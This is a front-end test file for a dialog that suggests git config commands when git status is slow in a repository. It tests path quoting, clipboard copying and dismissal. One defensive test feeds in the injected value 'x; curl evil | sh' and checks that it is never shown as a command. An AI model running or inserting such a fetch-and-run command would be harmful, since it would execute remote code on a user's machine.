import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { useState } from "react";
import { vi } from "vitest";
import { adviceCommands, formatDuration, primeCommand, type GitAdviceTarget } from "../grid/gitAdvice";
import GitAdviceDialog from "../grid/GitAdviceDialog";
import GitAdviceMark from "../grid/GitAdviceMark";
import type { Session } from "../grid/types";

const clipboardDescriptor = Object.getOwnPropertyDescriptor(navigator, "clipboard");

function session(overrides: Partial<Session> = {}): Session {
  return {
    id: 1,
    tmuxName: "mm-1",
    toolId: 1,
    dir: "/src/mono",
    status: "running",
    branch: "main",
    gitState: "clean",
    gitAdvice: { costMs: 2400, everyMs: 48000, settings: ["core.fsmonitor", "core.untrackedCache"] },
    ...overrides,
  };
}

const markName = /git status is slow/i;

type Mark = Omit<GitAdviceTarget, "trigger">;

// The page owns the dialog, as GridPage and MobileSessionView do, so a click
// inside it never bubbles through a tile header's own handlers.
function Harness({ marks = [{ serverId: "local", session: session() }] }: { marks?: Mark[] }) {
  const [target, setTarget] = useState<GitAdviceTarget | null>(null);
  return (
    <>
      {marks.map(({ serverId, session }) => (
        <GitAdviceMark key={`${serverId}:${session.id}`} serverId={serverId} session={session} onOpen={setTarget} />
      ))}
      {target && <GitAdviceDialog target={target} onClose={() => setTarget(null)} />}
    </>
  );
}

afterEach(() => {
  vi.restoreAllMocks();
  localStorage.clear();
  if (clipboardDescriptor) Object.defineProperty(navigator, "clipboard", clipboardDescriptor);
  else Object.defineProperty(navigator, "clipboard", { configurable: true, value: undefined });
});

test("adviceCommands targets the session's dir so they run from anywhere", () => {
  expect(adviceCommands("/src/mono", ["core.fsmonitor", "core.untrackedCache"])).toEqual([
    "git -C /src/mono config core.fsmonitor true",
    "git -C /src/mono config core.untrackedCache true",
  ]);
});

test("adviceCommands quotes a dir the shell would otherwise split or expand", () => {
  expect(adviceCommands("/src/my repo", ["core.fsmonitor"])).toEqual([
    "git -C '/src/my repo' config core.fsmonitor true",
  ]);
  expect(adviceCommands("/src/it's $HOME", ["core.fsmonitor"])).toEqual([
    "git -C '/src/it'\\''s $HOME' config core.fsmonitor true",
  ]);
});

test("primeCommand is a plain status in the same dir", () => {
  expect(primeCommand("/src/mono")).toBe("git -C /src/mono status");
  expect(primeCommand("/src/my repo")).toBe("git -C '/src/my repo' status");
});

test("formatDuration picks the unit a person would say", () => {
  expect(formatDuration(850)).toBe("850ms");
  expect(formatDuration(2400)).toBe("2.4s");
  expect(formatDuration(48000)).toBe("48s");
  expect(formatDuration(100000)).toBe("2 min");
  expect(formatDuration(300000)).toBe("5 min");
});

test("renders nothing for a session with no advice", () => {
  const { container } = render(<Harness marks={[{ serverId: "local", session: session({ gitAdvice: undefined }) }]} />);
  expect(container).toBeEmptyDOMElement();
});

test("the mark opens a dialog saying how slow the repo is and what to run", async () => {
  render(<Harness />);
  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();

  await userEvent.click(screen.getByRole("button", { name: markName }));

  const dialog = screen.getByRole("dialog", { name: "git status is slow in this repo" });
  expect(dialog).toHaveAttribute("aria-modal", "true");
  expect(dialog).toHaveTextContent("2.4s");
  expect(dialog).toHaveTextContent("48s");
  expect(within(dialog).getByText("git -C /src/mono config core.fsmonitor true")).toBeInTheDocument();
  expect(within(dialog).getByText("git -C /src/mono config core.untrackedCache true")).toBeInTheDocument();
  expect(within(dialog).getByRole("button", { name: "Close" })).toHaveFocus();
});

test("only the settings the daemon advised are offered", async () => {
  const advice = { costMs: 900, everyMs: 18000, settings: ["core.untrackedCache"] };
  render(<Harness marks={[{ serverId: "local", session: session({ gitAdvice: advice }) }]} />);
  await userEvent.click(screen.getByRole("button", { name: markName }));
  const dialog = screen.getByRole("dialog");
  expect(within(dialog).getByText("git -C /src/mono config core.untrackedCache true")).toBeInTheDocument();
  expect(dialog).not.toHaveTextContent("core.fsmonitor");
});

test("Copy puts that one command on the clipboard and says so", async () => {
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
  render(<Harness />);
  await userEvent.click(screen.getByRole("button", { name: markName }));

  await userEvent.click(screen.getByRole("button", { name: "Copy core.untrackedCache command" }));

  expect(writeText).toHaveBeenCalledWith("git -C /src/mono config core.untrackedCache true");
  expect(await screen.findByText("Copied.")).toBeInTheDocument();
});

test("Copy says to copy by hand where the clipboard is unavailable", async () => {
  // Plain-http dev on a phone has no clipboard API.
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: undefined });
  render(<Harness />);
  await userEvent.click(screen.getByRole("button", { name: markName }));

  await userEvent.click(screen.getByRole("button", { name: "Copy core.fsmonitor command" }));

  expect(await screen.findByText(/select the command and copy it manually/i)).toBeInTheDocument();
});

test("Escape closes the dialog and hands focus back to the mark", async () => {
  render(<Harness />);
  const mark = screen.getByRole("button", { name: markName });
  await userEvent.click(mark);

  await userEvent.keyboard("{Escape}");

  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  expect(mark).toHaveFocus();
});

test("dismissing hides the mark for every tile in that repo, and only that repo", async () => {
  render(
    <Harness
      marks={[
        { serverId: "local", session: session({ id: 1 }) },
        { serverId: "local", session: session({ id: 2 }) },
        { serverId: "local", session: session({ id: 3, dir: "/src/other" }) },
        { serverId: "remote", session: session({ id: 4 }) },
      ]}
    />,
  );
  expect(screen.getAllByRole("button", { name: markName })).toHaveLength(4);

  await userEvent.click(screen.getAllByRole("button", { name: markName })[0]);
  await userEvent.click(screen.getByRole("button", { name: "Don't show for this repo" }));

  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  // Left standing: the other dir on this server, and the same path on another machine.
  expect(screen.getAllByRole("button", { name: markName })).toHaveLength(2);
});

test("a dismissal outlives the page", async () => {
  const first = render(<Harness />);
  await userEvent.click(screen.getByRole("button", { name: markName }));
  await userEvent.click(screen.getByRole("button", { name: "Don't show for this repo" }));
  first.unmount();

  render(<Harness />);

  expect(screen.queryByRole("button", { name: markName })).not.toBeInTheDocument();
});

test("a setting this client does not know is never turned into a command", async () => {
  // The list comes from a daemon, possibly a remote one; only the settings
  // this page can explain become something to paste into a shell.
  const advice = { costMs: 900, everyMs: 18000, settings: ["core.untrackedCache", "x; curl evil | sh"] };
  render(<Harness marks={[{ serverId: "local", session: session({ gitAdvice: advice }) }]} />);
  await userEvent.click(screen.getByRole("button", { name: markName }));
  expect(screen.getByRole("dialog")).not.toHaveTextContent("curl");
});

test("advice naming only unknown settings shows no mark", () => {
  const advice = { costMs: 900, everyMs: 18000, settings: ["core.somethingNew"] };
  const { container } = render(<Harness marks={[{ serverId: "local", session: session({ gitAdvice: advice }) }]} />);
  expect(container).toBeEmptyDOMElement();
});

test("the dialog ends with the one status run that makes the settings take effect", async () => {
  // The daemon's own checks never write to the repo, so until the user runs a
  // git command that does, git has nowhere to keep what the settings let it learn.
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
  render(<Harness />);
  await userEvent.click(screen.getByRole("button", { name: markName }));
  const dialog = screen.getByRole("dialog");

  const commands = Array.from(dialog.querySelectorAll(".git-advice-command code")).map((code) => code.textContent);
  expect(commands).toEqual([
    "git -C /src/mono config core.fsmonitor true",
    "git -C /src/mono config core.untrackedCache true",
    "git -C /src/mono status",
  ]);

  await userEvent.click(within(dialog).getByRole("button", { name: "Copy git status command" }));
  expect(writeText).toHaveBeenCalledWith("git -C /src/mono status");
});
